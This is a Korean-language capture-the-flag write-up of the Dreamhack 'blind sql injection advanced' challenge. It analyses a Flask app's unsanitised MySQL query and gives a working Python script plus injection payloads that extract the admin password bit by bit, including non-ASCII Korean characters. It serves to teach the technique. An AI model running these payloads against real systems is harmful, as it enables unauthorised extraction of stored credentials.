# [Dreamhack Wargame] blind sql injection advanced
### [🚩blind sql injection advanced](https://dreamhack.io/wargame/challenges/411/)
  <img width="1071" alt="blind sqli advanced_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/dace6131-3120-42c6-b7cb-8d97064f988e">

<br/><br/>

## 문제 지문 분석
*관리자의 비밀번호는 "아스키코드"외 "한글"로 구성되어 있습니다.* <br/> &nbsp;&nbsp; → Blind SQL Injection 공격을 진행할 때 **데이터가 반드시 아스키 범위로 구성되었을 것**이라는 고정관념을 가지지 말아야 함을 의미함
* 실제 현실에서 사용하는 데이터베이스에서는 대상 웹 사이트 및 언어 셋에 따라 영어 이외에도 한국어, 중국어, 일본어 등 다양한 언어로 구성되어 있을 확률이 높음
    - 아스키코드 범위로만 Blind SQL Injection을 진행한다면 올바르지 않은 형태로 데이터가 추출될 가능성이 매우 높음
* **utf-8** 언어셋에서 한글은 11,172개의 경우의 수가 존재함 → 이를 순차적으로 증가시키면서 브루트포싱하여 비밀번호를 획득하는 것은 매우 비효율적임
    - 추출 시간이 오래 걸릴 뿐더러, 방화벽 및 관제에 의해 탐지될 가능성이 매우 높기 때문
    - 해결책으로 **비트 연산을 이용한 Blind SQL Injection**을 사용하여 좀 더 효율적으로 공격을 수행할 수 있음

<br/><br/>

## 문제 파일 분석
### init.sql
```sql
CREATE DATABASE user_db CHARACTER SET utf8; -- user_db의 언어셋: utf-8
GRANT ALL PRIVILEGES ON user_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `user_db`;
CREATE TABLE users ( -- CREATE TABLE로 users 테이블 생성 (열: idx, uid, upw)
  idx int auto_increment primary key, -- auto_increment (시작값은 1, 새로운 행이 추가될 때마다 1씩 자동증가)
  uid varchar(128) not null,
  upw varchar(128) not null -- 패스워드는 한글과 아스키코드의 조합으로 이루어져 있음
);

--- users 테이블에 admin 계정 생성 (idx: 1, uid: admin, upw: 플래그)
INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');

--- users 테이블에 guest 계정 생성 (idx: 2, uid: guest, upw: guest)
INSERT INTO users (uid, upw) values ('guest', 'guest');

-- users 테이블에 test 계정 생성 (idx: 3, uid: test, upw: test)
INSERT INTO users (uid, upw) values ('test', 'test');
FLUSH PRIVILEGES;
```
* init.sql 실행 결과로 생성된 user_db 데이터베이스의 users 테이블
    | idx (primary key) | uid | upw |
    |---|---|---|
    | 1 | 'admin' | 플레그 |
    | 2 | 'guest' | 'guest' |
    | 3 | 'test' | 'test' |

<br/>

### app.py
```python
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL

# Flask와 mysql을 이용한 웹 서버가 동작하고 있음
app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

# 인덱스 페이지
@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '') # 이용자가 전달한 uid 인자값을 가져옴
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';") # uid를 이용해 users 테이블을 조회하는 쿼리를 생성한 후 실행함

    return render_template_string(template, uid=uid, nrows=nrows) # template 변수의 내용을 화면에 출력함 (uid, nrows를 인자로 제공)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 부분
이용자가 전달한 uid가 별도의 필터링 없이 바로 mysql 쿼리로 사용되기 때문에 SQL Injection이 발생함
* 쿼리의 실행 결과를 그대로 출력하지 않고 쿼리의 성공 여부만 알 수 있음 → Blind SQL Injection을 이용해 공격해야 함
* SQL Injection 테스트
    - 코드를 보면 입력값을 ```'``` 문자로 감싸고 있으므로 ```'``` 문자를 넣어 SQL Injection 공격을 수행해야 함
        | 참을 반환하게 만드는 uid 입력값 | 거짓을 반환하게 만드는 uid 입력값 |
        |---|---|
        | ```' or 1=1 LIMIT 0,1-- -``` | ```' or 1=2 LIMIT 0,1-- -``` |
    - template을 보면 row가 1개여야 하는 조건(```nrows == 1```)을 만족해야 결과값을 출력하므로 쿼리의 출력의 행을 1로 제한해야 함
        + ```LIMIT 0,1```을 통해 row의 개수를 지정할 수 있음

<br/><br/>

### 익스플로잇
#### 익스플로잇 코드(blind_sqli_advanced.py)
```python
from requests import get # 파이썬의 requests 모듈을 이용

host = "http://host3.dreamhack.games:9745/" # host는 문제의 접속 정보에 따라 변경함


# 1. admin 패스워드 길이 찾기
password_length = 0 # admin 패스워드의 길이를 저장

# 비밀번호의 길이를 찾을 때까지 admin 패스워드의 길이를 1씩 증가시켜가며 반복함
while True:
    password_length += 1
    query = f"admin' and char_length(upw) = {password_length}-- -"
    r = get(f"{host}/?uid={query}")
    if "exists" in r.text: # "exists"가 응답으로 반환된 값에 포함되어 있다면 에러가 발생했다는 의미임
        break

print(f"password length: {password_length}")


password = "" # 각 위치별 문자를 저장하기 위한 변수
for i in range(1, password_length + 1): # i: 현재 탐색하고 있는 패스워드 내 문자의 위치
    # 2. i번째 위치의 문자의 비트열 길이 찾기
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"character {i}'s bit length: {bit_length}")
    
    # 3. i번째 위치의 문자의 비트열을 추출 (한글의 경우 최대 24번, 아스키 코드의 경우 최대 8번의 요청을 수행함)
    bits=""
    for j in range(1, bit_length + 1):
        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1' -- -"
        r = get(f"{host}/?uid={query}")
        if "exists" in r.text:
            bits += "1"
        else:
            bits += "0"
    print(f"character {i}'s bits: {bits}")
    
    # 4.i번째 위치의 문자의 비트열을 문자로 변환하고 해당 문자를 password 변수에 추가함
    password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")

# 5. 비트 연산을 이용한 Blind SQL Injection 공격을 수행하여 얻은 패스워드를 출력함
print(f"password: {password}")
```

<br/>

#### 익스플로잇 과정
1. Blind SQL Injection을 수행하기 전에 admin 패스워드의 길이를 알아내기 위한 코드를 작성하고 실행시킴
    - admin 패스워드의 길이를 알아내기 위해 공격자가 전송해야 하는 쿼리
        ```sql
        SELECT * FROM users WHERE uid='admin' AND CHAR_LENGTH(upw)={password_length}-- -'
        # 공격자의 입력값: admin' AND CHAR_LENGTH(upw)={password_length}-- -
        ```
        + 문자열 인코딩에 따른 정확한 길이를 계산하기 위해서 ```CHAR_LENGTH``` 함수를 사용함
            - ```LENGTH``` 함수는 문자열의 자릿수가 아니라 문자열의 Byte 길이를 가져오기 때문에 사용 불가
                + 아스키 코드로 문자열이 구성되어 있지 않다면 올바르지 않은 값을 반환할 수 있음
            - ```CHAR_LENGTH('문자열')``` 함수: 문자열이 단순히 몇 개가 있는지 측정해서 반환하는 함수(문자열의 글자 수를 세어 그 결과를 반환하는 함수)

2. 패스워드의 각 문자가 한글인지 아스키코드인지 알 수 없기 때문에 각 문자를 비트열로 표현했을 때의 길이를 알아내기 위한 코드를 작성하여 실행시킴
    - 각 문자의 비트열 길이를 알아내기 위해 공격자가 전송해야 하는 쿼리
        ```sql
        SELECT * FROM users WHERE uid='admin' AND LENGTH(BIN(ORD(SUBSTR(upw, {i}, 1)))) = {bit_length}-- -'
        # 공격자의 입력값: admin' AND LENGTH(BIN(ORD(SUBSTR(upw, {i}, 1)))) = {bit_length}-- -
        ```
        + 비트열은 모두 0과 1로 구성되어 있어 ```LENGTH``` 함수를 이용해 길이를 구할 수 있음
            - ```LENGTH('문자열')``` 함수: 문자열을 bytes 형태로 표현했을 때의 길이를 반환하는 함수
            - ```AND``` 이후 쿼리문의 의미: upw의 i번째 위치의 문자를 가져와 아스키 코드 값으로 변환한 다음 이를 다시 2진수로 변환하여 그 길이를 {bit_length}와 비교함

3. 패스워드의 각 문자에 해당하는 비트열을 추출함
    - 아스키 코드의 경우 최대 8번, 한글의 경우 최대 24번의 요청을 추출할 수 있음
    - 각 문자에 해당하는 비트열을 구하기 위해 공격자가 전송해야 하는 쿼리
        ```sql
        SELECT * FROM users WHERE uid='admin' AND SUBSTR(BIN(ORD(SUBSTR(upw, {i}, 1))), {j}, 1) = '1'-- -'
        # 공격자의 입력값: admin' AND SUBSTR(BIN(ORD(SUBSTR(upw, {i}, 1))), {j}, 1) = '1'-- -
        ```
        + '''AND''' 이후의 쿼리문의 의미 (i는 패스워드에서 현재 문자의 위치를, j는 해당 문자읠 비트열에서 현재 비트의 위치를 나타냄)
            - upw의 i번째 위치의 문자의 2진수(비트열)에서 j번째 위치의 비트가 '1'인지 비교함 → 1이면 참을, 0이면 거짓을 반환함

4. 추출한 비트열을 문자로 변환시켜면 admin 계정의 비밀번호를 획득할 수 있음
    - 한글과 같이 아스키코드 범위가 아닌 문자의 경우 인코딩에 유의해여 변환해야 함
    - 비트열을 다시 문자로 변환하기 위해 수행하는 과정
        1. 비트열을 정수로 변환 - ```int``` 클래스 사용
        2. 정수를 Bid endian 형태의 문자로 변환 - ```int.to_bytes()``` 함수를 사용함
        3. 변환된 문자를 인코딩에 맞게 변환 - ```bytes.decode()``` 함수를 사용함

5. 획득한 패스워드를 출력함
    <img width="977" alt="blind_sqli_advanced_result" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/a5a7653d-f897-4859-abf7-fc2dc6cb4b48">
